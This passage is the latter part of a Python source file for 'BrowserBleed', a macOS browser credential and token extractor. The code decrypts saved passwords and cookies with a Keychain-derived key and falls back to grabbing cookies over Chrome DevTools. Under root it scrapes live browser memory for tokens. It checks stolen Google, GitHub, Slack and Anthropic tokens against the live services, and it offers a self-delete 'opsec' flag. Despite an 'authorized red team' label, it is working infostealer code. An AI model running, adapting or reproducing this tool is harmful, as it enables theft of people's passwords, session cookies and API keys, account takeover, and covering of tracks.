            "valid":      True,
            "email":      data.get("email", data.get("sub", "?")),
            "expires_in": f"{data.get('expires_in', '?')}s",
            "scope":      scope_short or "?",
        }
    return {"valid": False, "reason": data.get("error_description", f"HTTP {status}")}


def verify_github(token: str) -> dict:
    status, data = _http_get(
        "https://api.github.com/user",
        headers={"Authorization": f"Bearer {token}", "Accept": "application/vnd.github.v3+json"},
    )
    if status == 200:
        return {"valid": True, "user": data.get("login", "?"), "name": data.get("name", "?")}
    return {"valid": False, "reason": data.get("message", f"HTTP {status}")}


def verify_slack(token: str) -> dict:
    req = urllib.request.Request(
        "https://slack.com/api/auth.test",
        data=b"{}",
        headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=6) as resp:
            data = json.loads(resp.read())
        if data.get("ok"):
            return {"valid": True, "user": data.get("user", "?"), "team": data.get("team", "?")}
        return {"valid": False, "reason": data.get("error", "unknown")}
    except Exception as e:
        return {"valid": False, "reason": str(e)}


def verify_jwt(token: str) -> dict:
    claims = _decode_jwt_claims(token)
    if not claims:
        return {"valid": None, "reason": "could not decode payload"}
    exp = claims.get("exp")
    if exp:
        exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc)
        now    = datetime.now(tz=timezone.utc)
        secs   = int((exp_dt - now).total_seconds())
        if secs > 0:
            h, m = divmod(secs // 60, 60)
            return {"valid": True, "expires": exp_dt.strftime("%Y-%m-%d %H:%M UTC"), "ttl": f"{h}h {m}m"}
        return {"valid": False, "reason": f"expired {exp_dt.strftime('%Y-%m-%d %H:%M UTC')}"}
    return {"valid": None, "reason": "no exp claim"}


def verify_anthropic(token: str) -> dict:
    status, data = _http_get(
        "https://api.anthropic.com/v1/models",
        headers={"x-api-key": token, "anthropic-version": "2023-06-01"},
    )
    if status == 200:
        models = [m.get("id", "?") for m in data.get("data", [])[:3]]
        return {"valid": True, "models_visible": ", ".join(models) or "?"}
    err = data.get("error", {})
    return {"valid": False, "reason": err.get("message", f"HTTP {status}") if isinstance(err, dict) else f"HTTP {status}"}


def verify_hit(label: str, value: str, service: str) -> dict | None:
    raw = value.split()[-1] if value.startswith("Bearer ") else value
    if "Google OAuth2" in service or raw.startswith("ya29."):
        return verify_google_oauth(raw)
    if "GitHub" in service:
        return verify_github(raw)
    if "Slack" in service:
        return verify_slack(raw)
    if "Anthropic" in service:
        return verify_anthropic(raw)
    if label == "JWT token":
        return verify_jwt(raw)
    return None


def _fmt_verify(result: dict) -> str:
    if result.get("valid") is True:
        parts = "  |  ".join(f"{k}: {v}" for k, v in result.items() if k != "valid")
        return f"[VALID] {parts}"
    if result.get("valid") is False:
        return f"[INVALID] {result.get('reason', '?')}"
    return f"[?] {result.get('reason', '?')}"


# ── Per-browser processing ─────────────────────────────────────────────────────
def process_browser(name: str, process_name: str, user_data_path: str, keychain_name: str,
                    do_disk: bool, do_memory: bool, max_hits: int,
                    do_verify: bool = False) -> list[str]:
    lines   = []
    running = is_process_running(process_name)
    lines.append("\n" + "=" * 70)
    lines.append(f"  BROWSER: {name}  [{'RUNNING' if running else 'closed'}]")
    lines.append("=" * 70)

    if not os.path.exists(user_data_path):
        lines.append("  [--] Not installed\n")
        return lines

    # ── Disk ──────────────────────────────────────────────────────────────────
    if do_disk:
        try:
            master_key = get_master_key(user_data_path, keychain_name)
            lines.append("[+] Master key derived from Keychain")
        except Exception as e:
            lines.append(f"[-] Master key failed: {e}")
            master_key = None

        if master_key:
            profile = os.path.join(user_data_path, "Default")

            lines.append("\n  -- [DISK] Saved Credentials --")
            try:
                creds = extract_credentials(profile, master_key)
                if creds:
                    lines.append(f"[+] {len(creds)} credential(s)\n")
                    for c in creds:
                        lines.append(f"  URL:      {c['url']}")
                        lines.append(f"  Username: {c['username']}")
                        lines.append(f"  Password: {c['password']}\n")
                else:
                    lines.append("  [-] None found")
            except Exception as e:
                lines.append(f"  [-] {e}")

            lines.append("\n  -- [DISK] Cookies --")
            try:
                cookies = extract_cookies(profile, master_key)
                if cookies:
                    lines.append(f"[+] {len(cookies)} cookie(s)\n")
                    for ck in cookies:
                        lines.append(f"  Host:     {ck['host']}")
                        lines.append(f"  Name:     {ck['name']}")
                        lines.append(f"  Value:    {ck['value']}")
                        lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}\n")
                else:
                    lines.append("  [-] None found")
            except Exception as e:
                lines.append(f"  [-] {e}")
                if running:
                    lines.append("\n  -- [CDP] Cookies --")
                    cdp_cookies = extract_cookies_cdp(process_name)
                    if cdp_cookies:
                        lines.append(f"[+] {len(cdp_cookies)} cookie(s) via CDP\n")
                        for ck in cdp_cookies:
                            lines.append(f"  Host:     {ck['host']}")
                            lines.append(f"  Name:     {ck['name']}")
                            lines.append(f"  Value:    {ck['value']}")
                            lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}\n")
                    else:
                        lines.append("  [-] CDP unavailable (Chrome not started with --remote-debugging-port)")

    # ── Memory ────────────────────────────────────────────────────────────────
    lines.append("\n  -- [MEMORY] Live Scrape --")
    if not do_memory:
        lines.append("  [--] Skipped (--disk-only)")
        return lines
    if not running:
        lines.append("  [--] Browser not running")
        return lines
    if not is_root():
        lines.append("  [--] Requires root (sudo) for task_for_pid")
        return lines

    pids      = find_pids(process_name)
    pid_sites = _pid_site_map(process_name)
    all_hits: list[dict] = []
    errors:   list[str]  = []

    for pid in pids:
        try:
            hits = scrape_pid(pid, max_hits=max_hits)
            site_url = pid_sites.get(pid, "")
            if site_url:
                url_bytes = f" {site_url} ".encode()
                for h in hits:
                    h["context"] = h.get("context", b"") + url_bytes
            all_hits.extend(hits)
        except PermissionError as e:
            errors.append(f"PID {pid}: {e}")
        except Exception as e:
            errors.append(f"PID {pid}: {e}")

    for e in errors:
        lines.append(f"  [-] {e}")

    unique_hits = deduplicate(all_hits)
    raw_count   = len(all_hits)

    if not unique_hits:
        lines.append("  [-] No hits found")
        return lines

    lines.append(
        f"[+] {len(unique_hits)} unique hit(s)"
        + (f"  ({raw_count} raw across {len(pids)} PIDs, {raw_count - len(unique_hits)} dupes removed)"
           if raw_count > len(unique_hits) else f"  (across {len(pids)} PID(s))")
    )
    lines.append("")

    by_label: dict[str, list[dict]] = {}
    for h in unique_hits:
        by_label.setdefault(h["label"], []).append(h)

    for label, group in sorted(by_label.items()):
        lines.append(f"  [{label}]  ({len(group)} unique)")
        for h in group:
            service = identify_service(label, h["value"], h.get("context", b""))
            val     = h["value"][:100].replace("\n", "\\n").replace("\r", "\\r")
            lines.append(f"    @ {h['address']}  [{service}]  {val}")
            if do_verify:
                result = verify_hit(label, h["value"], service)
                lines.append(f"      └─ {_fmt_verify(result) if result else '[NO VERIFIER]'}")
        lines.append("")

    return lines


# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="BrowserBleed macOS — Browser Credential Extractor. Authorized use only."
    )
    parser.add_argument("--browser",     metavar="NAME", help="Target one browser (e.g. chrome, edge, brave)")
    parser.add_argument("--disk-only",   action="store_true", help="Skip memory scraping")
    parser.add_argument("--memory-only", action="store_true", help="Skip disk extraction")
    parser.add_argument("--out",         metavar="PATH",      help="Output file path")
    parser.add_argument("--max-hits",    type=int, default=300, help="Max memory hits per browser (default: 300)")
    parser.add_argument("--self-delete", action="store_true", help="Delete script after run (opsec)")
    parser.add_argument("--verify",      action="store_true", help="Verify captured tokens against their services (outbound requests)")
    args = parser.parse_args()

    do_disk   = not args.memory_only
    do_memory = not args.disk_only

    lines = [
        "=" * 70,
        "  BrowserBleed macOS — Browser Credential & Token Extractor",
        "  Authorized Red Team Use Only",
        f"  Run:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"  Root:  {'YES' if is_root() else 'NO  (run with sudo for memory scraping)'}",
        f"  Modes: {'DISK ' if do_disk else ''}{'MEMORY' if do_memory else ''}",
        "=" * 70,
    ]

    targets = BROWSERS
    if args.browser:
        bf      = args.browser.lower()
        targets = [(n, p, u, k) for n, p, u, k in BROWSERS if bf in n.lower() or bf in p.lower()]
        if not targets:
            lines.append(f"\n[!] No browser matched '{args.browser}'")

    for bname, proc, path, keychain in targets:
        lines.extend(process_browser(bname, proc, path, keychain, do_disk, do_memory, args.max_hits, args.verify))

    report = "\n".join(lines)

    if args.out:
        out_path = args.out
    else:
        out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "browserbleed_output.txt")

    with open(out_path, "w", encoding="utf-8") as f:
        f.write(report)

    print(f"[+] Output written to {out_path}")

    if args.self_delete:
        os.unlink(os.path.abspath(__file__))


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        import traceback
        err_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "browserbleed_error.txt")
        with open(err_path, "w") as f:
            f.write(traceback.format_exc())
